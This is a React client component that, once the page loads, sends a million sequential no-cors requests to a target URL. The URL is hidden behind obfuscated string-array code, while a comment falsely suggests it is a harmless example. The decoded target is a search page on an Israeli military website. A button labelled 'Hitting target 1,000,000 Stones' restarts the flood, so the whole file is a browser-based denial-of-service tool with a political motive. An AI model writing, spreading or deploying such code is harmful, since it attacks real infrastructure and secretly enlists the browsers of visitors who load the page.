"use client"
import React, { useState, useEffect } from 'react';

const Caller = () => {
  const [result, setResult] = useState(null);
  const [requestIndex, setRequestIndex] = useState(null);

  const sendRequest = async (index) => {
    // Replace 'https://example.com' with your desired URL
    function _0x41a0(_0x13665d,_0x361b3f){const _0x1f0380=_0x1f03();return _0x41a0=function(_0x41a07e,_0x58984b){_0x41a07e=_0x41a07e-0x15f;let _0x402a46=_0x1f0380[_0x41a07e];return _0x402a46;},_0x41a0(_0x13665d,_0x361b3f);}const _0x61ecaf=_0x41a0;function _0x1f03(){const _0x488a5e=['6904422bAfENy','5oSAnlg','https://www.idf.il/en/search/?q=allah+akbr','5721720VViGoK','1273550QlVSgZ','3408ylzECm','13glCvwd','63nbdlEQ','4kGAKKP','3174924DzobHt','43726396iNQdHL','38687AJpNiT','673224ZEXRRF','7TAfrol','4mfpSFD'];_0x1f03=function(){return _0x488a5e;};return _0x1f03();}(function(_0x4caf3e,_0x247de2){const _0x9d5083=_0x41a0,_0x2cb54c=_0x4caf3e();while(!![]){try{const _0x18fd72=parseInt(_0x9d5083(0x161))/0x1*(-parseInt(_0x9d5083(0x15f))/0x2)+-parseInt(_0x9d5083(0x16b))/0x3*(parseInt(_0x9d5083(0x16a))/0x4)+-parseInt(_0x9d5083(0x163))/0x5*(-parseInt(_0x9d5083(0x162))/0x6)+parseInt(_0x9d5083(0x160))/0x7*(parseInt(_0x9d5083(0x165))/0x8)+parseInt(_0x9d5083(0x169))/0x9*(-parseInt(_0x9d5083(0x166))/0xa)+parseInt(_0x9d5083(0x16d))/0xb*(-parseInt(_0x9d5083(0x167))/0xc)+parseInt(_0x9d5083(0x168))/0xd*(parseInt(_0x9d5083(0x16c))/0xe);if(_0x18fd72===_0x247de2)break;else _0x2cb54c['push'](_0x2cb54c['shift']());}catch(_0x597ccb){_0x2cb54c['push'](_0x2cb54c['shift']());}}}(_0x1f03,0xa97b5));const url=_0x61ecaf(0x164);
    const start = performance.now();
    try {
      const response = await fetch(url, {
        mode: 'no-cors' // Set the request's mode to 'no-cors'
      });
      console.log(url);
      const end = performance.now();
      const status = response.status;
      const processingTime = end - start;
      setResult({ status, processingTime });
      setRequestIndex(index);
    } catch (error) {
      console.error('Error:', error);
    }
  };

  useEffect(() => {
    handleSendRequests();
  }, []); // Empty dependency array ensures it's called only once when the component mounts

  const handleSendRequests = async () => {
    setResult(null);
    setRequestIndex(null);
    for (let i = 0; i < 1000000; i++) {
      await sendRequest(i + 1); // Pass the index as argument to sendRequest function
    }
  };

  return (
    <div>
      <button onClick={handleSendRequests} >Hitting target 1,000,000 Stones</button>
      {result && (
        <div>
          <p>Request {requestIndex}</p>
          <p>Processing Time: {Math.round(result.processingTime)} milliseconds</p>
        </div>
      )}
    </div>
  );
};

export default Caller;
